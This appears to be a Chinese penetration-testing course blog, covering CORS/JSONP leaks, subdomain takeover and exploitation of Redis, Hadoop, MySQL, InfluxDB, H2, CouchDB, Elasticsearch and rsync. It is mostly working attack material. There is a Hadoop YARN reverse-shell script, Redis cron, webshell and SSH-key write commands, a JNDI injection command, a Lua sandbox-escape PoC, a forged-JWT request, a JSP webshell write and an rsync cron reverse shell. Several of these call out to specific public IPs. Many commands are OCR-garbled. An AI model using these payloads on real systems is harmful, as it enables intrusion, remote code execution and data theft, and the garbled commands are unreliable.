<h4 id="前置知识点："><a href="#前置知识点：" class="headerlink" title="#前置知识点："></a>#前置知识点：</h4><p>同源策路(SOP),“同源”包括三个条件：同协议同域名同端口<br>同源策路限制从一个源加载的文档或脚本与来自另一个源的资源进行交互，这是一个用于隔<br>离潜在恶意文件的关键的安全机制简单说就是浏览器的一种安全策略。<br>虽然同源策路在安全方面起到了很好的防护作用，但也在一定程度上限制了一些前端功能的<br>实现，所以就有了许多跨域的手段。</p>
<p>子域名接管：<br>域名解析记录指向域名，对应主机指向了一个当前未在使用或已经删除的特定服务，攻击<br>者通过注册指向域名，从而控制当前域名的控制权，实现恶意软件分发、网络钓鱼&#x2F;鱼叉式<br>网络钓鱼、XSS、身份验证绕过等。子域名接管不仅仅限于CNAME记录，NS,MX甚至A<br>记录也会受到影响。<br>检测项目：<br><a href="https://github.com/pwnesia/dnstake">https://github.com/pwnesia/dnstake</a><br><a href="https://github.com/anshumanbh/tko-subs">https://github.com/anshumanbh/tko-subs</a><br><a href="https://github.com/mhmdiaa/second-order">https://github.com/mhmdiaa/second-order</a><br><a href="https://github.com/r3curs1v3-proxy/sub404">https://github.com/r3curs1v3-proxy/sub404</a></p>
<h4 id="COSP跨域资源（为了解决非同域名资源调用的问题）"><a href="#COSP跨域资源（为了解决非同域名资源调用的问题）" class="headerlink" title="COSP跨域资源（为了解决非同域名资源调用的问题）"></a>COSP跨域资源（为了解决非同域名资源调用的问题）</h4><p>CORS全称Cross-Origin Resource Sharing,跨域资源共享，是HTML5的一个新特性，已被<br>所有浏刘览器支持，跨域资原共享(C0RS)是一种放宽同源策路的机制，它允许浏览器向跨源<br>服务器，发出XMLHttpRequesti请求，从而克服了AJAX只能同源使用的限制，以使不同的<br>网站可以跨域获取数据。<br>Access-Control-.Allow-Origin:指定鄂些域可以访问域资源。伤例如，如果requester.com想<br>要访问provider…com的资源，那么开发人员可以使用此标头安全地授子requester…com对<br>provider…com资源的访问权限<br>Access-Control–Allow-Credentials:指定浏览器是否将使用请求发送cookie。仅当alow-<br>credentials标头设置为true时，才会发送Cookie.<br>Access-Control-.Allow-Methods:指定可以使用那些HTTP请求方法（GET,PUT,<br>DELETE等）来访问资源。此标头允许开发人员通过在requester.com情求访问<br>provider.com的资源时，指定哪些方法有效来进一步增强安全性。<br>检测项目：<a href="https://github.com/chenjj/CORScanner">https://github.com/chenjj/CORScanner</a></p>
<h4 id="JSONP跨域回调"><a href="#JSONP跨域回调" class="headerlink" title="JSONP跨域回调"></a><strong>JSONP跨域回调</strong></h4><p>JSONP跨域巧妙的利用了scriptt标签能跨域的特点，实现了json的跨域传输。<br>检测项目：手工审查元素筛选或Burp项目<br><a href="https://github.com/p1g3/JSONP-Hunter">https://github.com/p1g3/JSONP-Hunter</a></p>
<h4 id="演示案例：-31"><a href="#演示案例：-31" class="headerlink" title="演示案例："></a>演示案例：</h4><p>CORS资源跨域敏感页面源码获取<br>JSONP回调跨域-某牙个人信息泄露<br>子域名接管瓜迪个人子域名劫持接管<br>检测项目-CORS&amp;JSONP&amp;子域名接管</p>
<p><strong>CORS和CSRF攻击的区别</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CORS  资源共享</span><br><span class="line">用户A在登录自己的后台或什么页面，这个时候访问了第三方的页面</span><br><span class="line">第三方页面去请求这个后台或页面的内容，用户A访问的页面即将页面的内容泄露了</span><br><span class="line">只做 资源的获取</span><br><span class="line"></span><br><span class="line">CSRF 同源策略就失败</span><br><span class="line">黑客可以去操作后台</span><br><span class="line">操作添加用户，修改密码等</span><br></pre></td></tr></table></figure>

<h4 id="CORS资源跨域致感页面源码获取"><a href="#CORS资源跨域致感页面源码获取" class="headerlink" title="#CORS资源跨域致感页面源码获取"></a>#CORS资源跨域致感页面源码获取</h4><p>复现步骤：<br>1、本地塔建访问页面跨域调用URL<br>2、受害者访问当前页面被资源共享<br>思路：受害者登录后台界面–访问恶意构造的链接–致使后台资源发送到攻击者vps</p>
<p>上述代码为请求<a href="http://localhost/Zblog/zb_system/admin/index.php%E8%BF%99%E4%B8%AA%E5%9C%B0%E5%9D%80%EF%BC%8C%E7%84%B6%E5%90%8E%E5%9B%A0%E4%B8%BA%E8%BF%99%E6%98%AF%E7%BD%91%E7%AB%99%E5%90%8E%E5%8F%B0%E6%98%AF%E7%99%BB%E5%BD%95%E7%8A%B6%E6%80%81%E5%8F%AF%E4%BB%A5%E7%9B%B4%E6%8E%A5%E8%AE%BF%E9%97%AE%EF%BC%8C%E9%82%A3%E4%B9%88%E5%B0%B1%E4%BC%9A%E6%8A%8A%E9%87%8C%E9%9D%A2%E7%9A%84%E5%86%85%E5%AE%B9%E4%BB%A5%E5%8F%98%E9%87%8Fz0%E5%8F%91%E5%88%B0http://localhost:80/cors1.php%E3%80%82%E7%84%B6%E5%90%8Ecors1.php%E5%B0%B1%E4%BC%9A%E6%8E%A5%E6%94%B6%E5%8F%98%E9%87%8F%E5%8F%91%E9%80%81%E7%9A%84%E8%AF%B7%E6%B1%82%E5%B9%B6%E4%BF%9D%E5%AD%98%E5%88%B0%E6%9C%AC%E5%9C%B0%E3%80%82">http://localhost/Zblog/zb_system/admin/index.php这个地址，然后因为这是网站后台是登录状态可以直接访问，那么就会把里面的内容以变量z0发到http://localhost:80/cors1.php。然后cors1.php就会接收变量发送的请求并保存到本地。</a><br>整个攻击的流程和csrf非常的相似，但是大多数网站目前都开启的同源策略会导致CSRF失效，而通过资源跨域可以实现敏感信息泄露。</p>
<p>在白盒代码审计的情况下就是看设置问题了，就是看origin设置的是不是*，是星号，那么就有这个漏洞。而黑盒就是看origin设置后能通过资源。上面说过这个origin这个值在请求头中，那我们是不是可以抓包修改。</p>
<p>参考链接：<a href="https://www.freebuf.com/articles/web/204023.html">https://www.freebuf.com/articles/web/204023.html</a></p>
<p>#JSONP回调跨域某牙个人信息泄露<br>复现步骤：<br>1、登录某牙找到回调有敏感信息<br>2、本地搭建访问页面跨域调用URL<br>3、访问本地页面可获取当前某牙信息<br>当用户点击这个html之后就会被攻击者得到回调<br>而这个和csrf的区别就是一般大型网站都会检测同源策略，所以你只能用这个回调去获取一些信息。而找这个漏洞就是看你能不能找到这个回调，回调里面有没有敏感信息。如果有那么这里就有安全问题。可以直接在数据包那里搜callback来查看回调</p>
<p>#子域名接管瓜迪个人子域名劫持接管<br>复现步骤：Xia0di8com<br>1、通过检测cname获取指向<br>2、发现testxiaodi fun过期受控<br>3、注册testxiaodi fun:实现控制</p>
<p>#检测项目-CORS&amp;JSONP&amp;子域名接管<br>1.python cors_scan.py-i top_100_domains.tx-t 100<br>2、人工排查+burpsuite安装Jsonp_Hunter py抓包使用<br>3、dnsub爬取子域名筛选接管</p>
<h1 id="第55天-服务攻防-数据库安全-Redis-Hadoop-Mysqla-未授权访问-RCE"><a href="#第55天-服务攻防-数据库安全-Redis-Hadoop-Mysqla-未授权访问-RCE" class="headerlink" title="第55天 服务攻防-数据库安全&amp;Redis&amp;Hadoop&amp;Mysqla&amp;未授权访问&amp;RCE"></a>第55天 服务攻防-数据库安全&amp;Redis&amp;Hadoop&amp;Mysqla&amp;未授权访问&amp;RCE</h1><h4 id="知识点：-35"><a href="#知识点：-35" class="headerlink" title="知识点："></a>知识点：</h4><p>1、服务攻防数据库类型安全<br>2、Redis&amp;Hadoop&amp;Mysql安全<br>3、Mysql-CVE-2012-2122漏洞<br>4、Hadoop-配置不当未授权三重奏&amp;RCE漏洞<br>3、Redis-配置不当未授权三重奏&amp;RCE两漏洞</p>
<h4 id="章节内容：-1"><a href="#章节内容：-1" class="headerlink" title="#章节内容："></a>#章节内容：</h4><p>常见服务应用的安全测试：<br>1、配置不当-未授权访问<br>2、安全机制特定安全漏洞<br>3、安全机制弱口令爆破攻击</p>
<h4 id="前置知识：-4"><a href="#前置知识：-4" class="headerlink" title="#前置知识："></a>#前置知识：</h4><p>应用服务安全测试流程：见图<br>组合猜测（由于nat会导致端口扫描不到真实端口信息）、信息来源（报错、特征）<br>1、判断服务开放情况-端口扫描&amp;组合应用等<br>2、判断服务类型归属数据库&amp;文件传翰&amp;通讯等<br>3、判断服务利用方式特定漏洞&amp;未授权&amp;弱口令等演示案例：</p>
<p>Mysql-未授权访问-CVE-2012-2122利用<br>Hadoop-.未授权访问-内置配合命令执行RCE<br>Redis-未授权访问-Webshell&amp;任务&amp;密匙&amp;RCE等</p>
<p><strong>Mysql-未授权访问-CVE-2012-2122利用</strong><br>复现环境：vulhub      出现的可能性不大</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">for i in `seq 1 1000`; do mysql -uroot -pwrong -h you-ip -P3306 ; done </span><br></pre></td></tr></table></figure>

<p>漏洞复现：</p>
<p>1、vulhub开启漏洞环境</p>
<p>2、攻击机：kali扫描目标端口并验证</p>
<p><strong>Hadoop-未授权访问-内置配合命令执行RCE</strong><br>复现环境：vulfocus<br>思路：访问特定</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">target = <span class="string">&#x27;http://127.0.0.1:8088/&#x27;</span></span><br><span class="line">lhost = <span class="string">&#x27;192.168.0.1&#x27;</span> <span class="comment"># put your local host ip here, and listen at port 9999</span></span><br><span class="line"></span><br><span class="line">url = target + <span class="string">&#x27;ws/v1/cluster/apps/new-application&#x27;</span></span><br><span class="line">resp = requests.post(url)</span><br><span class="line">app_id = resp.json()[<span class="string">&#x27;application-id&#x27;</span>]</span><br><span class="line">url = target + <span class="string">&#x27;ws/v1/cluster/apps&#x27;</span></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&#x27;application-id&#x27;</span>: app_id,</span><br><span class="line">    <span class="string">&#x27;application-name&#x27;</span>: <span class="string">&#x27;get-shell&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;am-container-spec&#x27;</span>: &#123;</span><br><span class="line">        <span class="string">&#x27;commands&#x27;</span>: &#123;</span><br><span class="line">            <span class="string">&#x27;command&#x27;</span>: <span class="string">&#x27;/bin/bash -i &gt;&amp; /dev/tcp/%s/9999 0&gt;&amp;1&#x27;</span> % lhost,</span><br><span class="line">        &#125;,</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="string">&#x27;application-type&#x27;</span>: <span class="string">&#x27;YARN&#x27;</span>,</span><br><span class="line">&#125;</span><br><span class="line">requests.post(url, json=data)</span><br></pre></td></tr></table></figure>

<p>漏洞复现：<br>1、vulhub搭建hadoop漏洞环境</p>
<p>2、攻击机kali开启nc监听端口，使用exp攻击反弹shell</p>
<p>#Redis-未授权访问-Webshell&amp;任务&amp;密匙&amp;RCE等<br>1、写Webshell需得到Web路径<br>利用条件：Web目录权限可读写</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">config set dir /tmp</span><br><span class="line">#设置WEB写入目录</span><br><span class="line">config set dbfilename1.php设置写入文件名</span><br><span class="line">set test&quot;c?php phpinfo):?&gt;&quot;#设置写入文件代码</span><br><span class="line">bgsave</span><br><span class="line">#保存执行</span><br><span class="line">save</span><br><span class="line">#保存执行</span><br></pre></td></tr></table></figure>

<p>注意：部分没目录权限读写权限</p>
<p>2、写定时任务反单shell<br>利用条件：<br>允许异地登录<br>安全模式protected-mode处于关闭状态</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">config set dir /var/spool/cron</span><br><span class="line">set yy “ninin*****bash-&gt;&amp;/dev/tcp/47.94.236.117/55550&gt;&amp;1nnn”</span><br><span class="line">config set dbfilename x</span><br><span class="line">save</span><br></pre></td></tr></table></figure>

<p>注意：<br>centos会忽略乱码去执行格式正确的任务计划<br>而ubuntu并不会忽略这些乱L码，所以导致命令执行失败</p>
<p>3、写入Linux ssh-key公钥<br>利用条件：<br>允许异地登录<br>Redis服务使用ROOT账号启动<br>安全模式protected-mode处于关闭状态<br>允许使用密钥登录，即可远程写入一个公钥，直接登录远程服务器</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh-keygen-t rsa</span><br><span class="line">cd /root/.ssh/</span><br><span class="line">(echo -e “nin”;cat id_rsa.pub;echo-e&quot;nin&quot;)&gt;key.txt</span><br><span class="line">cat key.txt redis-cli-h 118.31.57.214 -x set xxx</span><br><span class="line">config set dir /root/.ssh/</span><br><span class="line">config set dbfilename authorized keys</span><br><span class="line">save</span><br><span class="line">cd /root/.ssh/</span><br><span class="line">ssh -i id rsa root@118.31.57.214</span><br></pre></td></tr></table></figure>

<p>4、RCE自动化利用脚本-vulfocus<br><a href="https://github.com/vulhub/redis-rogue-getshell">https://github.com/vulhub/redis-rogue-getshell</a><br>python redis-.master…py-f123.58.236.76-p9830-L47.94.236.117-P8888-f<br>RedisModulesSDK&#x2F;exp.so -c “id”</p>
<p>5.新漏洞-沙箱绕过RCE CVE-2022-0543-vulfocus<br>Poc:执行id命令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">eval &#x27;local io_I package.loadlib(“/usr/lib/x86_64-linux-gnu/liblua5.1.so.0”,“luaopen_io”);</span><br><span class="line">local io io_I（）;local f=io.popen(“id”,“r”);local res f.read(“a”);f:close（）;return res’o</span><br></pre></td></tr></table></figure>

<p>参考链接：<a href="https://blog.csdn.net/qq_40882763/article/details/129742604?spm=1001.2101.3001.6650.2&utm_medium=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~Rate-2-129742604-blog-130589818.235%5Ev40%5Epc_relevant_3m_sort_dl_base1&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~Rate-2-129742604-blog-130589818.235%5Ev40%5Epc_relevant_3m_sort_dl_base1&utm_relevant_index=5">https://blog.csdn.net/qq_40882763/article/details/129742604?spm=1001.2101.3001.6650.2&amp;utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7ECTRLIST%7ERate-2-129742604-blog-130589818.235%5Ev40%5Epc_relevant_3m_sort_dl_base1&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7ECTRLIST%7ERate-2-129742604-blog-130589818.235%5Ev40%5Epc_relevant_3m_sort_dl_base1&amp;utm_relevant_index=5</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">附加：其实日常中最常见的就是redis和mysql这两种数据库最好常见，特别是redis未授权访问，在内网渗透中就很重要，ssrf+redis内网渗透就很有名，而且通过redis的未授权访问可以达到上传shell的作用。</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">注意：redis搭建时候千万不要无密码或者弱密码，不然就很容易中病毒</span><br><span class="line">参考：https://juejin.cn/post/7195199519624003642   会导致服务器基本就是没用了</span><br></pre></td></tr></table></figure>

<h1 id="第56天-服务攻防-数据库安全-H2-Elasticsearch-CouchDB-Influxdb复现"><a href="#第56天-服务攻防-数据库安全-H2-Elasticsearch-CouchDB-Influxdb复现" class="headerlink" title="第56天 服务攻防-数据库安全&amp;H2&amp;Elasticsearch&amp;CouchDB&amp;Influxdb复现"></a>第56天 服务攻防-数据库安全&amp;H2&amp;Elasticsearch&amp;CouchDB&amp;Influxdb复现</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">前言：这一小节中的数据库现在使用已经很少了，主要就是要知道还有这些数据库的存在。</span><br></pre></td></tr></table></figure>

<h4 id="知识点：-36"><a href="#知识点：-36" class="headerlink" title="知识点："></a>知识点：</h4><p>1、服务攻防数据库类型安全<br>2、influxdb,.未授权访问wt验证<br>3、H2 database-未授权访问-配置不当<br>4、CouchDB-权限绕过配合RCE-漏洞<br>5、ElasticSearch-文件写入&amp;RCE-漏洞</p>
<h4 id="章节内容：-2"><a href="#章节内容：-2" class="headerlink" title="#章节内容："></a>#章节内容：</h4><p>常见服务应用的安全测试：<br>1、配置不当-未授权访问<br>2、安全机制特定安全漏洞<br>3、安全机制弱口令爆破攻击</p>
<h4 id="前置知识：-5"><a href="#前置知识：-5" class="headerlink" title="#前置知识："></a>#前置知识：</h4><p>应用服务安全测试流程：见图<br>1、判断服务开放情况端口扫描&amp;组合应用等<br>2、判折服务类型归属数据库&amp;文件传输&amp;通讯等<br>3、判折服务利用方式特定漏洞&amp;未授权&amp;弱口令等</p>
<h4 id="演示案例：-32"><a href="#演示案例：-32" class="headerlink" title="演示案例："></a>演示案例：</h4><p>Influxdb-未授权访问-Jwt验证不当<br>H2database-未授权访问-配置不当<br>CouchDB-权限绕过配合RCE-漏洞<br>ElasticSearch-文件写入&amp;RCE-漏洞</p>
<h4 id="nfluxdb-未授权访问-Jwt验证不当"><a href="#nfluxdb-未授权访问-Jwt验证不当" class="headerlink" title="#nfluxdb-未授权访问-Jwt验证不当"></a>#nfluxdb-未授权访问-Jwt验证不当</h4><p>默认端☐：8086,8088<br>influxdb是一款菩名的时序数据库，其使用jwt作为鉴权方式。在用户开启了认证，但未设<br>置参数shared-secret的情况下，jwt的认证密钥为空字符串，此时攻击者可以伪造任意用户<br>身份在influxdb中执行SQL语句，<br>1、使用 <a href="https://jwt.io/">https://jwt.io/</a> 生成一个带有空密钥的有效 JWT 令牌：      ——-JWT也是CTF比赛中常考知识点。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">alg&quot;:&quot;HS256&quot;,</span><br><span class="line">&quot;typ&quot;:&quot;JWT&quot;</span><br><span class="line">&#125;</span><br><span class="line">&#123;</span><br><span class="line">&quot;usemame&quot;:&quot;admin&quot;,</span><br><span class="line">&quot;exp&quot;:1676346267</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其中是管理员帐户名称，是令牌过期时间。您应该设置为将来的时间以使其生效：username exp exp</p>
<p>然后把这个令牌带到请求中，并成功在服务器中执行SQL语句：show users</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/query</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>your-ip</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>en</span><br><span class="line"><span class="attribute">Authorization</span><span class="punctuation">: </span>Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoyOTg2MzQ2MjY3fQ.LJDvEy5zvSEpA_C6pnK3JJFkUKGq9eEi8T2wdum3R_s</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>22</span><br><span class="line"></span><br><span class="line"><span class="language-ini"><span class="attr">db</span>=sample&amp;q=show+users</span></span><br><span class="line"><span class="language-ini"></span></span><br></pre></td></tr></table></figure>

<h4 id="H2-database-未授权访问-配置不当"><a href="#H2-database-未授权访问-配置不当" class="headerlink" title="#H2 database-未授权访问-配置不当"></a>#H2 database-未授权访问-配置不当</h4><p>默认端口：20051<br>H2 database是一款Java内存数据库，多用于单元测试。H2 database自带一个Web管理页<br>面，在Spring开发中，如果我们设置如下选项，即可允许外部用户访问Wb管理页面，且<br>没有鉴权：默认端口：<br>spring.h2.console.enabled&#x3D;true<br>spring.h2.console.settings.web-allow-others&#x3D;true<br>利用这个管理页面，我们可以进行JND注入攻击，进而在目标环境下执行任意命令。<br>管理页面默认为。<a href="http://your-ip:8080/">http://your-ip:8080</a>  <a href="http://your-ip:8080/h2-console/">http://your-ip:8080/h2-console/</a><br>1、下载JNDI-Injection-Exploit<br><a href="https://github.com/welk1n/JNDI-Injection-Exploit">https://github.com/welk1n/JNDI-Injection-Exploit</a><br>2、生成执行RMI Payload-URL<br>-C执行命令-A服务器地址<br>java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar-C touch &#x2F;tmp&#x2F;success -A 47.94.236.117</p>
<p>在攻击机运行poc，执行后攻击机会监听8180、1099、1389端口</p>
<p>javax.naming.InitialContext是 JNDI 工厂类名，URL 是恶意的 RMI 地址。rmi:&#x2F;&#x2F;evil:23456&#x2F;BypassByEL<br>攻击机的 RMI 服务器收到以下请求：</p>
<p>touch &#x2F;tmp&#x2F;success已成功执行：</p>
<h4 id="CouchDB-权限绕过RCE-CVE-2017-12636"><a href="#CouchDB-权限绕过RCE-CVE-2017-12636" class="headerlink" title="#CouchDB-权限绕过RCE-CVE-2017-12636"></a>#CouchDB-权限绕过RCE-CVE-2017-12636</h4><p>1、下载exp.py<br>2、修改目标和反弹地址<br>3、Python3调用执行即可<br><a href="https://github.com/vulhub/vulhub/blob/master/couchdb/CVE-2017-12636/exp.py">https://github.com/vulhub/vulhub/blob/master/couchdb/CVE-2017-12636/exp.py</a></p>
<h4 id="ElasticSearch-文件写入-RCE漏洞"><a href="#ElasticSearch-文件写入-RCE漏洞" class="headerlink" title="#ElasticSearch-文件写入&amp;RCE漏洞"></a>#ElasticSearch-文件写入&amp;RCE漏洞</h4><p>默认端口：92009300<br>Elasticsearch RCE CVE-2014-3120<br>1、漏洞需要s中至少存在一条数据，所以我们需要先创建一条数据</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line">POST /website/blog/HTTP/1.1</span><br><span class="line">Host:your-ip:9200</span><br><span class="line">Accept:*/</span><br><span class="line">Accept-Language:en</span><br><span class="line">User-Agent:Mozilla/5.0 (compatible;MSIE 9.0:Windows NT 6.1;Win64:x64:Trident/5.0)</span><br><span class="line">Connection:close</span><br><span class="line">Content-Type:application/x-www-form-urlencoded</span><br><span class="line">Content-Length:25</span><br><span class="line">&#123;</span><br><span class="line">&quot;name&quot;:&quot;xiaodi&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>2、直接发包触发执行命令</p>
<p>Elasticsearch文件写入wooyun2015110216<br>9200一股为ElasticSearch的常用端口，此漏洞环境需要与中间件使用<br>1、发现9200端口存在elasti-search页面，8080存在tomcat目录<br>2、利用ElasticSearch写入后门到&#x2F;usr&#x2F;local&#x2F;tomcat&#x2F;webapps&#x2F;wwwroot&#x2F;</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl -XPOST http://123.58.236.76:31556/yz.jsp/yz jsp/1-d&#x27;</span><br><span class="line">[&quot;&lt;%new java.io.RandomAccessFile(application.getRealPath(new String(new byte【】</span><br><span class="line">&#123;47,116,101,115,116,46,106,115,112)》，new String(new byte【】</span><br><span class="line">(114,119))).write(request.getParameter(new String(new byte[(102))).getBytes（）;</span><br><span class="line">%&gt;&quot;-&quot;test&quot;</span><br><span class="line">curl -XPUT &#x27;http://123.58.236.76:31556/snapshot/yz.jsp&#x27;-d&#x27;</span><br><span class="line">&quot;type&quot;.&quot;fs&quot;,</span><br><span class="line">&quot;settings&quot;:&#123;</span><br><span class="line">&quot;location&quot;:&quot;/usr/local/tomcat/webapps/wwwroot/&quot;,</span><br><span class="line">&quot;compress&quot;:false</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>3.、访问8080端口snapshot–yz jspi文件写入代码到test jsp中<br><a href="http://123.58.236.76:31557/wwwroot/indices/yz.jsp/snapshot-yz">http://123.58.236.76:31557/wwwroot/indices/yz.jsp/snapshot-yz</a> jsp?f&#x3D;success<br><a href="http://123.58.236.76:31557/wwwroot/test.jsp">http://123.58.236.76:31557/wwwroot/test.jsp</a></p>
<h1 id="第57天-服务攻防-应用协议-Rsync-SSH-RDP-FTP-漏洞批量扫描-口令拆解"><a href="#第57天-服务攻防-应用协议-Rsync-SSH-RDP-FTP-漏洞批量扫描-口令拆解" class="headerlink" title="第57天 服务攻防-应用协议&amp;Rsync&amp;SSH&amp;RDP&amp;FTP&amp;漏洞批量扫描&amp;口令拆解"></a>第57天 服务攻防-应用协议&amp;Rsync&amp;SSH&amp;RDP&amp;FTP&amp;漏洞批量扫描&amp;口令拆解</h1><h4 id="知识点：-37"><a href="#知识点：-37" class="headerlink" title="知识点："></a>知识点：</h4><p>1、服务攻防-远程控制&amp;文件传输等<br>2、远程控制-RDP&amp;RDP&amp;弱口令&amp;漏洞<br>3、文件传输-FTP&amp;Rsyc&amp;弱口令&amp;漏洞</p>
<h4 id="章节内容：-3"><a href="#章节内容：-3" class="headerlink" title="章节内容："></a>章节内容：</h4><p>常见服务应用的安全测试：<br>1、配置不当-未授权访问<br>2、安全机制特定安全漏洞<br>3、安全机制-弱口令爆破攻击</p>
<h4 id="前置知识：-6"><a href="#前置知识：-6" class="headerlink" title="前置知识："></a>前置知识：</h4><p>应用服务安全测试流程：见图<br>1、判断服务开放情况-端口扫描&amp;组合应用等<br>2、判断服务类型归属数据库&amp;文件传箱&amp;通讯等<br>3、判断服务利用方式特定漏洞&amp;未授权&amp;弱口令等</p>
<h4 id="演示案例：-33"><a href="#演示案例：-33" class="headerlink" title="演示案例："></a>演示案例：</h4><p>口令猜解-Hydra-FTP&amp;RDP&amp;SSH<br>配置不当-未授权访问-Rsync文件备份<br>高端课程-直接搜哈-MSF&amp;Fofaviewer<br>协议漏洞-应用软件-FTP&amp;Proftpd搭建<br>协议漏洞-应用软件-SSH&amp;libssh&amp;Openssh</p>
<h4 id="口令猜解-Hydra-FTP-RDP-SSH"><a href="#口令猜解-Hydra-FTP-RDP-SSH" class="headerlink" title="口令猜解-Hydra-FTP&amp;RDP&amp;SSH"></a><strong>口令猜解-Hydra-FTP&amp;RDP&amp;SSH</strong></h4><p><a href="https://github.com/vanhauser-thc/thc-hydra">https://github.com/vanhauser-thc/thc-hydra</a></p>
<p>hydra是一个自动化的爆破工具，暴力破解弱密码，  也是之前第52天讲到过的工具了这个是。<br>是一个支持众多协议的爆破工具，已经集成到KaliLinux中，直接在终端打开即可</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-l login 小写，指定用户名进行破解</span><br><span class="line">-L file 大写，指定用户的用户名字典</span><br><span class="line">-p pass 小写，用于指定密码破解，很少使用，一般采用密码字典。</span><br><span class="line">-P file 大写，用于指定密码字典。</span><br><span class="line">-C使用冒号分割格式，例如“登录名:密码”来代替 -L/-P 参数</span><br><span class="line">-e ns 额外的选项，n：空密码试探，s：使用指定账户和密码试探</span><br><span class="line">-M file 指定目标ip列表文件，批量破解。</span><br><span class="line">-o file 指定结果输出文件</span><br><span class="line">-f 找到第一对登录名或者密码的时候中止破解。</span><br><span class="line">-t tasks 同时运行的线程数，默认是16</span><br><span class="line">-S大写，采用SSL链接</span><br><span class="line">-s PORT 指定默认端口</span><br><span class="line">-w time 设置最大超时时间，单位</span><br><span class="line">-v / -V 显示详细过程</span><br><span class="line">-R 恢复爆破（如果破解中断了，下次执行 hydra -R /path/to/hydra.restore 就可以继续任务。）</span><br><span class="line">-x 自定义密码。</span><br></pre></td></tr></table></figure>

<h4 id="配置不当-未授权访问-Rsync文件备份"><a href="#配置不当-未授权访问-Rsync文件备份" class="headerlink" title="配置不当-未授权访问-Rsync文件备份"></a>配置不当-未授权访问-Rsync文件备份</h4><p>rsync是Linux下一款数据备份工具，支持通过rSnc协议、ssh协议进行远程文件传输。其<br>中rsynct协议默认监听873端口，如果目标开启了rsync服务，并且没有配置ACL或访问密<br>码，我们将可以读写目标服务器文件。<br>判断：rsync rsync:∥123.58.236.76:45854&#x2F;<br>利用：<br>-读取文件：rsync rsync:&#x2F;123.58.236.76:45854&#x2F;src&#x2F;<br>-下载文件：rsync rsync:&#x2F;123.58.236.76.45854&#x2F;src&#x2F;etc&#x2F;passwd&#x2F;<br>-上传文件：rsync-av passwd rsync:&#x2F;123.58.236.76:45854&#x2F;src&#x2F;tmp&#x2F;passwd<br>反弹shell:<br>1、获取信息：<br>rsync rsync:&#x2F;&#x2F;123.58.236.76:12177&#x2F;src&#x2F;etc&#x2F;crontab &#x2F;root&#x2F;cron.txt<br>2.创建文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">touch shell</span><br><span class="line">#!/bin/bash</span><br><span class="line">/bin/bash-i&gt;&amp;/dev/tcp/47.94.236.117/55660&gt;&amp;1</span><br><span class="line">chmod +x shell</span><br></pre></td></tr></table></figure>

<p>3、上传文件<br>rsync -av shell rsync:&#x2F;&#x2F;123.58.236.76:12177&#x2F;src&#x2F;etc&#x2F;cron.hourly<br>4、等待接受反弹</p>
<h4 id="高端课程-直接搜哈-MSF-Fofaviewer"><a href="#高端课程-直接搜哈-MSF-Fofaviewer" class="headerlink" title="高端课程-直接搜哈-MSF&amp;Fofaviewer"></a>高端课程-直接搜哈-MSF&amp;Fofaviewer</h4><p><a href="https://github.com/wgpsec/fofa_viewer">https://github.com/wgpsec/fofa_viewer</a><br>msfconsole<br>use auxiliary&#x2F;scanner&#x2F;rsync&#x2F;modules_list<br>set rhosts file:&#x2F;root&#x2F;ips.txt<br>set threads 10<br>run<br>思路：使用fofa查询端口为873的资产，使用msf批量扫描目的资产</p>
